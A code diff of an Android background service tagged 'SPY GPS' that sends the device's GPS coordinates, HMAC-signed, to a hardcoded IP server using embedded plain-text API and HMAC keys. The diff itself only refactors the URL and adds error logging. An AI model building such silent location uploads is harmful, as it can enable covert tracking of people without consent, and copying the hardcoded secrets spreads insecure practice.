@@ -13,21 +13,23 @@ import android.location.LocationManager;
 import com.android.volley.toolbox.*;
 import com.android.volley.*;
 
-import javax.crypto.Mac;
-import javax.crypto.spec.SecretKeySpec;
-
 import java.util.*;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.security.SignatureException;
 import java.util.Formatter;
 
-import org.json.JSONException;
+import javax.crypto.Mac;
+import javax.crypto.spec.SecretKeySpec;
+
 import org.json.JSONObject;
+
 
 public class MyService extends Service {
     private static final String HMAC_ALGORITHM = "HmacSHA1";
     private static final String HMAC_KEY = "ea86ec783c52d9e26607d11a1247485a";
+
+    private static final String API_URL = "http://137.74.197.251:8083/";
     private static final String API_KEY = "f5ee5dee5f9ded00a624ff4bf34eb3d3";
 
     final String LOG_TAG = "SPY GPS";
@@ -109,9 +111,8 @@ public class MyService extends Service {
         final String lng = String.valueOf(location.getLongitude());
 
         RequestQueue queue = Volley.newRequestQueue(this);
-        String url = "http://137.74.197.251:8083/";
 
-        StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
+        StringRequest stringRequest = new StringRequest(Request.Method.POST, API_URL,
                 new Response.Listener<String>() {
                     @Override
                     public void onResponse(String response) {
@@ -135,6 +136,7 @@ public class MyService extends Service {
                     jsonObject.put("lat", lat);
                     jsonObject.put("lng", lng);
                 } catch (Exception e) {
+                    Log.e(LOG_TAG, e.toString());
                 }
 
                 try {
@@ -144,10 +146,12 @@ public class MyService extends Service {
                     Log.d(LOG_TAG, signedBody);
                     params.put("signed_body", signedBody);
                 } catch (Exception e) {
+                    Log.e(LOG_TAG, e.toString());
                 }
 
                 return params;
             }
+            @Override
             public Map<String, String> getHeaders() {
                 Map<String, String> headers = new HashMap<>();
                 headers.put("Authorization", "Bearer " + API_KEY);
